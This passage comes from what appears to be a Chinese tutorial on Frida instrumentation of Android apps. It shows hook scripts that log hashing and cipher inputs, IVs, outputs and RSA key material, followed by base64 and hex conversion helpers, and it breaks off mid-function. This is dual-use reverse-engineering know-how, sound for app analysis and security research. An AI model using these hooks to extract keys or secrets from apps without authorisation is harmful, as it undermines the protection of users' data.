function_">showStacks</span>();</span><br><span class="line">        <span class="title function_">send</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">        <span class="title function_">send</span>(<span class="string">&quot;算法名：&quot;</span> + a);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">getInstance</span>(a);</span><br><span class="line">    &#125;</span><br><span class="line">    md.<span class="property">update</span>.<span class="title function_">overload</span>(<span class="string">&#x27;[B&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">a</span>) &#123;</span><br><span class="line">        <span class="title function_">showStacks</span>();</span><br><span class="line">        <span class="title function_">send</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">        <span class="title function_">send</span>(<span class="string">&quot;update:&quot;</span> + <span class="title function_">bytesToString</span>(a))</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">update</span>(a);</span><br><span class="line">    &#125;</span><br><span class="line">    md.<span class="property">update</span>.<span class="title function_">overload</span>(<span class="string">&#x27;[B&#x27;</span>, <span class="string">&#x27;int&#x27;</span>, <span class="string">&#x27;int&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">a, b, c</span>) &#123;</span><br><span class="line">        <span class="title function_">showStacks</span>();</span><br><span class="line">        <span class="title function_">send</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">        <span class="title function_">send</span>(<span class="string">&quot;update:&quot;</span> + <span class="title function_">bytesToString</span>(a) + <span class="string">&quot;|&quot;</span> + b + <span class="string">&quot;|&quot;</span> + c);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">update</span>(a, b, c);</span><br><span class="line">    &#125;</span><br><span class="line">    md.<span class="property">digest</span>.<span class="title function_">overload</span>().<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="title function_">showStacks</span>();</span><br><span class="line">        <span class="title function_">send</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">digest</span>();</span><br><span class="line">        <span class="title function_">send</span>(<span class="string">&quot;digest结果:&quot;</span> + <span class="title function_">bytesToHex</span>(result));</span><br><span class="line">        <span class="title function_">send</span>(<span class="string">&quot;digest结果:&quot;</span> + <span class="title function_">bytesToBase64</span>(result));</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    md.<span class="property">digest</span>.<span class="title function_">overload</span>(<span class="string">&#x27;[B&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">a</span>) &#123;</span><br><span class="line">        <span class="title function_">showStacks</span>();</span><br><span class="line">        <span class="title function_">send</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">        <span class="title function_">send</span>(<span class="string">&quot;digest参数:&quot;</span> + <span class="title function_">bytesToString</span>(a));</span><br><span class="line">        <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">digest</span>(a);</span><br><span class="line">        <span class="title function_">send</span>(<span class="string">&quot;digest结果:&quot;</span> + <span class="title function_">bytesToHex</span>(result));</span><br><span class="line">        <span class="title function_">send</span>(<span class="string">&quot;digest结果:&quot;</span> + <span class="title function_">bytesToBase64</span>(result));</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> ivParameterSpec = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;javax.crypto.spec.IvParameterSpec&#x27;</span>);</span><br><span class="line">    ivParameterSpec.<span class="property">$init</span>.<span class="title function_">overload</span>(<span class="string">&#x27;[B&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">a</span>) &#123;</span><br><span class="line">        <span class="title function_">showStacks</span>();</span><br><span class="line">        <span class="keyword">var</span> result = <span class="variable language_">this</span>.$init(a);</span><br><span class="line">        <span class="title function_">send</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">        <span class="title function_">send</span>(<span class="string">&quot;iv向量:&quot;</span> + <span class="title function_">bytesToString</span>(a));</span><br><span class="line">        <span class="title function_">send</span>(<span class="string">&quot;iv向量:&quot;</span> + <span class="title function_">bytesToHex</span>(a));</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> cipher = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;javax.crypto.Cipher&#x27;</span>);</span><br><span class="line">    cipher.<span class="property">getInstance</span>.<span class="title function_">overload</span>(<span class="string">&#x27;java.lang.String&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">a</span>) &#123;</span><br><span class="line">        <span class="title function_">showStacks</span>();</span><br><span class="line">        <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">getInstance</span>(a);</span><br><span class="line">        <span class="title function_">send</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">        <span class="title function_">send</span>(<span class="string">&quot;模式填充:&quot;</span> + a);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    cipher.<span class="property">update</span>.<span class="title function_">overload</span>(<span class="string">&#x27;[B&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">a</span>) &#123;</span><br><span class="line">        <span class="title function_">showStacks</span>();</span><br><span class="line">        <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">update</span>(a);</span><br><span class="line">        <span class="title function_">send</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">        <span class="title function_">send</span>(<span class="string">&quot;update:&quot;</span> + <span class="title function_">bytesToString</span>(a));</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    cipher.<span class="property">update</span>.<span class="title function_">overload</span>(<span class="string">&#x27;[B&#x27;</span>, <span class="string">&#x27;int&#x27;</span>, <span class="string">&#x27;int&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">a, b, c</span>) &#123;</span><br><span class="line">        <span class="title function_">showStacks</span>();</span><br><span class="line">        <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">update</span>(a, b, c);</span><br><span class="line">        <span class="title function_">send</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">        <span class="title function_">send</span>(<span class="string">&quot;update:&quot;</span> + <span class="title function_">bytesToString</span>(a) + <span class="string">&quot;|&quot;</span> + b + <span class="string">&quot;|&quot;</span> + c);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    cipher.<span class="property">doFinal</span>.<span class="title function_">overload</span>().<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="title function_">showStacks</span>();</span><br><span class="line">        <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">doFinal</span>();</span><br><span class="line">        <span class="title function_">send</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">        <span class="title function_">send</span>(<span class="string">&quot;doFinal结果:&quot;</span> + <span class="title function_">bytesToHex</span>(result));</span><br><span class="line">        <span class="title function_">send</span>(<span class="string">&quot;doFinal结果:&quot;</span> + <span class="title function_">bytesToBase64</span>(result));</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    cipher.<span class="property">doFinal</span>.<span class="title function_">overload</span>(<span class="string">&#x27;[B&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">a</span>) &#123;</span><br><span class="line">        <span class="title function_">showStacks</span>();</span><br><span class="line">        <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">doFinal</span>(a);</span><br><span class="line">        <span class="title function_">send</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">        <span class="title function_">send</span>(<span class="string">&quot;doFinal参数:&quot;</span> + <span class="title function_">bytesToString</span>(a));</span><br><span class="line">        <span class="title function_">send</span>(<span class="string">&quot;doFinal结果:&quot;</span> + <span class="title function_">bytesToHex</span>(result));</span><br><span class="line">        <span class="title function_">send</span>(<span class="string">&quot;doFinal结果:&quot;</span> + <span class="title function_">bytesToBase64</span>(result));</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> x509EncodedKeySpec = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;java.security.spec.X509EncodedKeySpec&#x27;</span>);</span><br><span class="line">    x509EncodedKeySpec.<span class="property">$init</span>.<span class="title function_">overload</span>(<span class="string">&#x27;[B&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">a</span>) &#123;</span><br><span class="line">        <span class="title function_">showStacks</span>();</span><br><span class="line">        <span class="keyword">var</span> result = <span class="variable language_">this</span>.$init(a);</span><br><span class="line">        <span class="title function_">send</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">        <span class="title function_">send</span>(<span class="string">&quot;RSA密钥:&quot;</span> + <span class="title function_">bytesToBase64</span>(a));</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> rSAPublicKeySpec = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;java.security.spec.RSAPublicKeySpec&#x27;</span>);</span><br><span class="line">    rSAPublicKeySpec.<span class="property">$init</span>.<span class="title function_">overload</span>(<span class="string">&#x27;java.math.BigInteger&#x27;</span>, <span class="string">&#x27;java.math.BigInteger&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">a, b</span>) &#123;</span><br><span class="line">        <span class="title function_">showStacks</span>();</span><br><span class="line">        <span class="keyword">var</span> result = <span class="variable language_">this</span>.$init(a, b);</span><br><span class="line">        <span class="title function_">send</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">        <span class="comment">//send(&quot;RSA密钥:&quot; + bytesToBase64(a));</span></span><br><span class="line">        <span class="title function_">send</span>(<span class="string">&quot;RSA密钥N:&quot;</span> + a.<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line">        <span class="title function_">send</span>(<span class="string">&quot;RSA密钥E:&quot;</span> + b.<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="11-常见转换模板"><a href="#11-常见转换模板" class="headerlink" title="11. 常见转换模板"></a>11. 常见转换模板</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//工具相关函数</span></span><br><span class="line"><span class="keyword">var</span> base64EncodeChars = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span>,</span><br><span class="line">    base64DecodeChars = <span class="keyword">new</span> <span class="title class_">Array</span>((-<span class="number">1</span>), (-<span class="number">1</span>), (-<span class="number">1</span>), (-<span class="number">1</span>), (-<span class="number">1</span>), (-<span class="number">1</span>), (-<span class="number">1</span>), (-<span class="number">1</span>), (-<span class="number">1</span>), (-<span class="number">1</span>), (-<span class="number">1</span>), (-<span class="number">1</span>), (-<span class="number">1</span>), (-<span class="number">1</span>), (-<span class="number">1</span>), (-<span class="number">1</span>), (-<span class="number">1</span>), (-<span class="number">1</span>), (-<span class="number">1</span>), (-<span class="number">1</span>), (-<span class="number">1</span>), (-<span class="number">1</span>), (-<span class="number">1</span>), (-<span class="number">1</span>), (-<span class="number">1</span>), (-<span class="number">1</span>), (-<span class="number">1</span>), (-<span class="number">1</span>), (-<span class="number">1</span>), (-<span class="number">1</span>), (-<span class="number">1</span>), (-<span class="number">1</span>), (-<span class="number">1</span>), (-<span class="number">1</span>), (-<span class="number">1</span>), (-<span class="number">1</span>), (-<span class="number">1</span>), (-<span class="number">1</span>), (-<span class="number">1</span>), (-<span class="number">1</span>), (-<span class="number">1</span>), (-<span class="number">1</span>), (-<span class="number">1</span>), <span class="number">62</span>, (-<span class="number">1</span>), (-<span class="number">1</span>), (-<span class="number">1</span>), <span class="number">63</span>, <span class="number">52</span>, <span class="number">53</span>, <span class="number">54</span>, <span class="number">55</span>, <span class="number">56</span>, <span class="number">57</span>, <span class="number">58</span>, <span class="number">59</span>, <span class="number">60</span>, <span class="number">61</span>, (-<span class="number">1</span>), (-<span class="number">1</span>), (-<span class="number">1</span>), (-<span class="number">1</span>), (-<span class="number">1</span>), (-<span class="number">1</span>), (-<span class="number">1</span>), <span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>, (-<span class="number">1</span>), (-<span class="number">1</span>), (-<span class="number">1</span>), (-<span class="number">1</span>), (-<span class="number">1</span>), (-<span class="number">1</span>), <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">32</span>, <span class="number">33</span>, <span class="number">34</span>, <span class="number">35</span>, <span class="number">36</span>, <span class="number">37</span>, <span class="number">38</span>, <span class="number">39</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">42</span>, <span class="number">43</span>, <span class="number">44</span>, <span class="number">45</span>, <span class="number">46</span>, <span class="number">47</span>, <span class="number">48</span>, <span class="number">49</span>, <span class="number">50</span>, <span class="number">51</span>, (-<span class="number">1</span>), (-<span class="number">1</span>), (-<span class="number">1</span>), (-<span class="number">1</span>), (-<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">stringToBase64</span>(<span class="params">e</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> r, a, c, h, o, t;</span><br><span class="line">    <span class="keyword">for</span> (c = e.<span class="property">length</span>, a = <span class="number">0</span>, r = <span class="string">&#x27;&#x27;</span>; a &lt; c;) &#123;</span><br><span class="line">        <span class="keyword">if</span> (h = <span class="number">255</span> &amp; e.<span class="title function_">charCodeAt</span>(a++), a == c) &#123;</span><br><span class="line">            r += base64EncodeChars.<span class="title function_">charAt</span>(h &gt;&gt; <span class="number">2</span>),</span><br><span class="line">                r += base64EncodeChars.<span class="title function_">charAt</span>((<span class="number">3</span> &amp; h) &lt;&lt; <span class="number">4</span>),</span><br><span class="line">                r += <span class="string">&#x27;==&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (o = e.<span class="title function_">charCodeAt</span>(a++), a == c) &#123;</span><br><span class="line">            r += base64EncodeChars.<span class="title function_">charAt</span>(h &gt;&gt; <span class="number">2</span>),</span><br><span class="line">                r += base64EncodeChars.<span class="title function_">charAt</span>((<span class="number">3</span> &amp; h) &lt;&lt; <span class="number">4</span> | (<span class="number">240</span> &amp; o) &gt;&gt; <span class="number">4</span>),</span><br><span class="line">                r += base64EncodeChars.<span class="title function_">charAt</span>((<span class="number">15</span> &amp; o) &lt;&lt; <span class="number">2</span>),</span><br><span class="line">                r += <span class="string">&#x27;=&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        &#125;</span><br><span class="line">        t = e.<span class="title function_">charCodeAt</span>(a++),</span><br><span class="line">            r += base64EncodeChars.<span class="title function_">charAt</span>(h &gt;&gt; <span class="number">2</span>),</span><br><span class="line">            r += base64EncodeChars.<span class="title function_">charAt</span>((<span class="number">3</span> &amp; h) &lt;&lt; <span class="number">4</span> | (<span class="number">240</span> &amp; o) &gt;&gt; <span class="number">4</span>),</span><br><span class="line">            r += base64EncodeChars.<span class="title function_">charAt</span>((<span class="number">15</span> &amp; o) &lt;&lt; <span class="number">2</span> | (<span class="number">192</span> &amp; t) &gt;&gt; <span class="number">6</span>),</span><br><span class="line">            r += base64EncodeChars.<span class="title function_">charAt</span>(<span class="number">63</span> &amp; t)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">base64ToString</span>(<span class="params">e</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> r, a, c, h, o, t, d;</span><br><span class="line">    <span class="keyword">for</span> (t = e.<span class="property">length</span>, o = <span class="number">0</span>, d = <span class="string">&#x27;&#x27;</span>; o &lt; t;) &#123;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">            r = base64DecodeChars[<span class="number">255</span> &amp; e.<span class="title function_">charCodeAt</span>(o++)];</span><br><span class="line">        <span class="keyword">while</span> (o &lt; t &amp;&amp; r == -<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (r == -<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">            a = base64DecodeChars[<span class="number">255</span> &amp; e.<span class="title function_">charCodeAt</span>(o++)];</span><br><span class="line">        <span class="keyword">while</span> (o &lt; t &amp;&amp; a == -<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (a == -<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        d += <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(r &lt;&lt; <span class="number">2</span> | (<span class="number">48</span> &amp; a) &gt;&gt; <span class="number">4</span>);</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (c = <span class="number">255</span> &amp; e.<span class="title function_">charCodeAt</span>(o++), <span class="number">61</span> == c)</span><br><span class="line">                <span class="keyword">return</span> d;</span><br><span class="line">            c = base64DecodeChars[c]</span><br><span class="line">        &#125; <span class="keyword">while</span> (o &lt; t &amp;&amp; c == -<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (c == -<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        d += <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>((<span class="number">15</span> &amp; a) &lt;&lt; <span class="number">4</span> | (<span class="number">60</span> &amp; c) &gt;&gt; <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (h = <span class="number">255</span> &amp; e.<span class="title function_">charCodeAt</span>(o++), <span class="number">61</span> == h)</span><br><span class="line">                <span class="keyword">return</span> d;</span><br><span class="line">            h = base64DecodeChars[h]</span><br><span class="line">        &#125; <span class="keyword">while</span> (o &lt; t &amp;&amp; h == -<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (h == -<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        d += <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>((<span class="number">3</span> &amp; c) &lt;&lt; <span class="number">6</span> | h)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> d</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hexToBase64</span>(<span class="params">str</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">base64Encode</span>(<span class="title class_">String</span>.<span class="property">fromCharCode</span>.<span class="title function_">apply</span>(<span class="literal">null</span>, str.<span class="title function_">replace</span>(<span class="regexp">/\r|\n/g</span>, <span class="string">&quot;&quot;</span>).<span class="title function_">replace</span>(<span class="regexp">/([\da-fA-F]&#123;2&#125;) ?/g</span>, <span class="string">&quot;0x$1 &quot;</span>).<span class="title function_">replace</span>(<span class="regexp">/ +$/</span>, <span class="string">&quot;&quot;</span>).<span class="title function_">split</span>(<span class="string">&quot; &quot;</span>)));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">base64ToHex</span>(<span class="params">str</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>, bin = <span class="title function_">base64Decode</span>(str.<span class="title function_">replace</span>(<span class="regexp">/[ \r\n]+$/</span>, <span class="string">&quot;&quot;</span>)), hex = []; i &lt; bin.<span class="property">length</span>; ++i) &#123;</span><br><span class="line">        <span class="keyword">var</span> tmp = bin.<span class="title function_">charCodeAt</span>(i).<span class="title function_">toString</span>(<span class="number">16</span>);</span><br><span class="line">        <span class="keyword">if</span> (tmp.<span class="property">length</span> === <span class="number">1</span>)</span><br><span class="line">            tmp = <span class="string">&quot;0&quot;</span> + tmp;</span><br><span class="line">        hex[hex.<span class="property">length</span>] = tmp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> hex.<span class="title function_">join</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hexToBytes</span>(<span class="params">str</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> pos = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">var</span> len = str.<span class="property">length</span>;</span><br><span class="line">    <span class="keyword">if</span> (len % <span class="number">2</span> != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    len /= <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">var</span> hexA = <span class="keyword">new</span> <span class="title class_">Array</span>();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        <span class="keyword">var</span> s = str.<span class="title function_">substr</span>(pos, <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">var</span> v = <span class="built_in">parseInt</span>(s, <span class="number">16</span>);</span><br><span class="line">        hexA.<span class="title function_">push</span>(v);</span><br><span class="line">        pos += <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> hexA;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">bytesToHex</span>(<span class="params">arr</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> str = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">var</span> k, j;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; arr.<span class="property">length</span>; i++) &#123;</span><br><span class="line">        k = arr[i];</span><br><span class="line">        j = k;</span><br><span class="line">        <span class="keyword">if</span> (k &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            j = k + <span class="number">256</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (j &lt; <span class="number">16</span>) &#123;</span><br><span class="line">            str += <span class="string">&quot;0&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        str += j.<span class="title function_">toString</span>(<span class="number">16</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">stringToHex</span>(<span class="params">str</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> val = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; str.<span class="property">length</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (val == <span class="string">&quot;&quot;</span>)</span><br><span class="line">            val = str.<span class="title function_">charCodeAt</span>(i).<span class="title function_">toString</span>(<span class="number">16</span>);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            val += str.<span class="title function_">charCodeAt</span>(i).<span class="title function_">toString</span>(<span class="number">16</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> val</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">stringToBytes</span>(<span class="params">str</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> ch, st, re = [];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; str.<span class="property">length</span>; i++) &#123;</span><br><span class="line">        ch = str.<span class="title function_">charCodeAt</span>(i);</span><br><span class="line">        st = [];</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            st.<span class="title function_">push</span>(ch &amp; <span class="number">0xFF</span>);</span><br><span class="line">            ch = ch &gt;&gt; <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (ch);</span><br><span class="line">        re = re.<span class="title function_">concat</span>(st.<span class="title function_">reverse</span>());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> re;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//将byte[]转成String的方法</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">bytesToString</span>(<span class="params">arr</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> str = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    arr = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>(arr);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i <span class="keyword">in</span> arr) &#123;</span><br><span class="line">        str += <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(arr[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">bytesToBase64</span>(<span class="params">e</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> r, a, c, h, o, t;</span><br><span class="line">    <span class="keyword">for</span> (c = e.<span class="property">length</span>, a = <span class="number">0</span>, r = <span class="string">&#x27;&#x27;</span>; a &lt; c;) &#123;</span><br><span class="line">        <span class="keyword">if</span> (h = <span class="number">255</span> &amp; e[a++], a == c) &#123;</span><br><span class="line">            r += base64EncodeChars.<span class="title function_">charAt</span>(h &gt;&gt; <span class="number">2</span>),</span><br><span class="line">                r += base64EncodeChars.<span class="title function_">charAt</span>((<span class="number">3</span> &amp; h) &lt;&lt; <span class="number">4</span>),</span><br><span class="line">                r += <span class="string">&#x27;==&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (o = e[a++], a == c) &#123;</span><br><span class="line">            r += base64EncodeChars.<span class="title function_">charAt</span>(h &gt;&gt; <span class="number">2</span>),</span><br><span class="line">                r += base64EncodeChars.<span class="title function_">charAt</span>((<span class="number">3</span> &amp; h) &lt;&lt; <span class="number">4</span> | (<span class="number">240</span> &amp; o) &gt;&gt; <span class="number">4</span>),</span><br><span class="line">                r += base64EncodeChars.<span class="title function_">charAt</span>((<span class="number">15</span> &amp; o) &lt;&lt; <span class="number">2</span>),</span><br><span class="line">                r += <span class="string">&#x27;=&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        &#125;</span><br><span class="line">        t = e[a++],</span><br><span class="line">            r += base64EncodeChars.<span class="title function_">charAt</span>(h &gt;&gt; <span class="number">2</span>),</span><br><span class="line">            r += base64EncodeChars.<span class="title function_">charAt</span>((<span class="number">3</span> &amp; h) &lt;&lt; <span class="number">4</span> | (<span class="number">240</span> &amp; o) &gt;&gt; <span class="number">4</span>),</span><br><span class="line">            r += base64EncodeChars.<span class="title function_">charAt</span>((<span class="number">15</span> &amp; o) &lt;&lt; <span class="number">2</span> | (<span class="number">192</span> &amp; t) &gt;&gt; <span class="number">6</span>),</span><br><span class="line">            r += base64EncodeChars.<span class="title function_">charAt</span>(<span class="number">63</span> &amp; t)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">base64ToBytes</span>(<span class="params">e</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> r, a, c, h, o, t, d;</span><br><span class="line">    <span class="keyword">for</span> (t = e.<span class="property">length</span>, o = <span class="number">0</span>, d = []; o &lt; t;) &#123;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">            r = base64DecodeChars[<span class="number">255</span> &amp; e.<span class="title function_">charCodeAt</span>(o++)];</span><br><span class="line">        <span class="keyword">while</span> (o &lt; t &amp;&amp; r == -<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (r == -<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">            a = base64DecodeChars[<span class="number">255</span> &amp; e.<span class="title function_">charCodeAt</span>(o++)];</span><br><span class="line">        <span class="keyword">while</span> (o &lt; t &amp;&amp; a == -<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (a == -<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        d.<span class="title function_">push</span>(r &lt;&lt; <span class="number">2</span> | (<span class="number">48</span> &amp; a) &gt;&gt; <span class="number">4</span>);</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (c = <span class="number">255</span> &amp; e.<span class="title 